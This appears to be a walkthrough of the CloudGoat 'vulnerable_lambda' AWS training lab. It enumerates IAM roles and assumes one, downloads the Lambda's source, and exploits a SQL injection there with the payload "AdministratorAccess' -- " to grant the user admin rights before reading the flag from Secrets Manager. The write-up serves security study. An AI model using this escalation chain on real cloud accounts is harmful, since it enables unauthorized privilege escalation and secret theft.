# Vulnerable Lambda

- Whoami
    ```sh
    $ aws --profile bilbo --region <your-region> sns publish --topic-arn arn:aws:sns:<your-region>:<valid-account-id>:aaa --message aaa
    ```

- List available roles (since the scenario resources has 1 IAM Role), we saw 1 role associated with our principal in which we can assume (`sts:AssumeRole`)
    ```sh
    $ aws --profile bilbo iam list-roles
    [snip]
        {
          "Path": "/",
          "RoleName": "cg-lambda-invoker-vulnerable_lambda_cgiddcanijvmlm",
          "RoleId": "AROAXPO7SZDZOE7BZA33U",
          "Arn": "arn:aws:iam::0123456789:role/cg-lambda-invoker-vulnerable_lambda_cgiddcanijvmlm",
          "CreateDate": "2023-10-30T12:30:11+00:00",
          "AssumeRolePolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
              {
                "Sid": "",
                "Effect": "Allow",
                "Principal": {
                  "AWS": "arn:aws:iam::0123456789:user/cg-bilbo-vulnerable_lambda_cgiddcanijvmlm"
                },
                "Action": "sts:AssumeRole"
              }
            ]
          },
          "MaxSessionDuration": 3600
        },
    [snip]

    ```

- Enumerate the roles
    ```sh
    $ aws --profile bilbo iam list-role-policies --role-name cg-lambda-invoker-vulnerable_lambda_cgiddcanijvmlm
    {
        "PolicyNames": [
            "lambda-invoker"
        ]
    }

    $ aws --profile bilbo iam get-role-policy --role-name cg-lambda-invoker-vulnerable_lambda_cgiddcanijvmlm --policy-name lambda-invoker
    {
        "RoleName": "cg-lambda-invoker-vulnerable_lambda_cgiddcanijvmlm",
        "PolicyName": "lambda-invoker",
        "PolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Action": [
                        "lambda:ListFunctionEventInvokeConfigs",
                        "lambda:InvokeFunction",
                        "lambda:ListTags",
                        "lambda:GetFunction",
                        "lambda:GetPolicy"
                    ],
                    "Effect": "Allow",
                    "Resource": [
                        "arn:aws:lambda:us-east-1:0123456789:function:vulnerable_lambda_cgiddcanijvmlm-policy_applier_lambda1",
                        "arn:aws:lambda:us-east-1:0123456789:function:vulnerable_lambda_cgiddcanijvmlm-policy_applier_lambda1"
                    ]
                },
                {
                    "Action": [
                        "lambda:ListFunctions",
                        "iam:Get*",
                        "iam:List*",
                        "iam:SimulateCustomPolicy",
                        "iam:SimulatePrincipalPolicy"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ]
        }
    }


    $ aws --region ap-southeast-1 --profile bilbo sts assume-role --role-arn arn:aws:iam::0123456789:role/cg-lambda-invoker-vulnerable_lambda_cgiddcanijvmlm --role-session-name invoker
    ```

- Next, add the `aws_access_key_id`, `aws_secret_access_key`, and `aws_session_token` to `~/.aws/credentials`
    ```
    ...

    [bilbo-invoker]
    aws_access_key_id = ...
    aws_secret_access_key = ...
    aws_session_token = ...
    ```

- Since, the lambda functions are located in `us-east-1` region, we need to explicitly specify when dealing with the functions
    ```sh
    $ aws --region us-east-1 --profile bilbo-invoker lambda list-functions
    {
        "Functions": [
            {
                "FunctionName": "vulnerable_lambda_cgiddcanijvmlm-policy_applier_lambda1",
                "FunctionArn": "arn:aws:lambda:us-east-1:0123456789:function:vulnerable_lambda_cgiddcanijvmlm-policy_applier_lambda1",
                "Runtime": "python3.9",
                "Role": "arn:aws:iam::0123456789:role/vulnerable_lambda_cgiddcanijvmlm-policy_applier_lambda1",
                "Handler": "main.handler",
                "CodeSize": 991559,
                "Description": "This function will apply a managed policy to the user of your choice, so long as the database says that it's okay...",
                "Timeout": 3,
                "MemorySize": 128,
                "LastModified": "2023-10-30T12:30:04.711+0000",
                "CodeSha256": "U982lU6ztPq9QlRmDCwlMKzm4WuOfbpbCou1neEBHkQ=",
                "Version": "$LATEST",
                "TracingConfig": {
                    "Mode": "PassThrough"
                },
                "RevisionId": "13498e18-8f0d-449d-aef7-4898237a1cc5",
                "PackageType": "Zip",
                "Architectures": [
                    "x86_64"
                ],
                "EphemeralStorage": {
                    "Size": 512
                },
                "SnapStart": {
                    "ApplyOn": "None",
                    "OptimizationStatus": "Off"
                }
            }
        ]
    }

- Download the source code
    ```sh
    $ aws --region us-east-1 --profile bilbo-invoker lambda get-function --function-name vulnerable_lambda_cgiddcanijvmlm-policy_applier_lambda1 \
        | jq -r '.Code.Location' | xargs -I{} wget '{}' -O vuln.zip
    ```

- Source code review => SQLi
    ```python
            statement = f"select policy_name from policies where policy_name='{policy}' and public='True'"
    ```

    ```sh
    $ aws --region us-east-1 --profile bilbo-invoker lambda invoke --function-name vulnerable_lambda_cgiddcanijvmlm-policy_applier_lambda1 --cli-binary-format raw-in-base64-out --payload file://payload.json out.json
    ```

    payload.json
    ```json
    {
        "user_name": "cg-bilbo-vulnerable_lambda_cgiddcanijvmlm",
        "policy_names": [
            "AdministratorAccess' -- "
        ]
    }
    ```

- Getting the secret
    ```sh
    $ aws --region us-east-1 --profile bilbo secretsmanager list-secrets
    {
        "SecretList": [
            {
                "ARN": "arn:aws:secretsmanager:us-east-1:0123456789:secret:vulnerable_lambda_cgiddcanijvmlm-final_flag-DTt8C2",
                "Name": "vulnerable_lambda_cgiddcanijvmlm-final_flag",
                "LastChangedDate": "2023-10-30T20:29:57.367000+08:00",
                "LastAccessedDate": "2023-10-30T08:00:00+08:00",
                "Tags": [
                    {
                        "Key": "Stack",
                        "Value": "CloudGoat"
                    },
                    {
                        "Key": "Name",
                        "Value": "cg-vulnerable_lambda_cgiddcanijvmlm"
                    },
                    {
                        "Key": "Scenario",
                        "Value": "vulnerable-lambda"
                    }
                ],
                "SecretVersionsToStages": {
                    "0BC6453F-BAF9-4785-B0D3-75887C806C8B": [
                        "AWSCURRENT"
                    ]
                },
                "CreatedDate": "2023-10-30T20:29:56.484000+08:00"
            }
        ]
    }

    $ aws --region us-east-1 --profile bilbo secretsmanager get-secret-value --secret-id vulnerable_lambda_cgiddcanijvmlm-final_flag
    {
        "ARN": "arn:aws:secretsmanager:us-east-1:0123456789:secret:vulnerable_lambda_cgiddcanijvmlm-final_flag-DTt8C2",
        "Name": "vulnerable_lambda_cgiddcanijvmlm-final_flag",
        "VersionId": "0BC6453F-BAF9-4785-B0D3-75887C806C8B",
        "SecretString": "cg-secret-846237-284529",
        "VersionStages": [
            "AWSCURRENT"
        ],
        "CreatedDate": "2023-10-30T20:29:57.362000+08:00"
    }
    ```
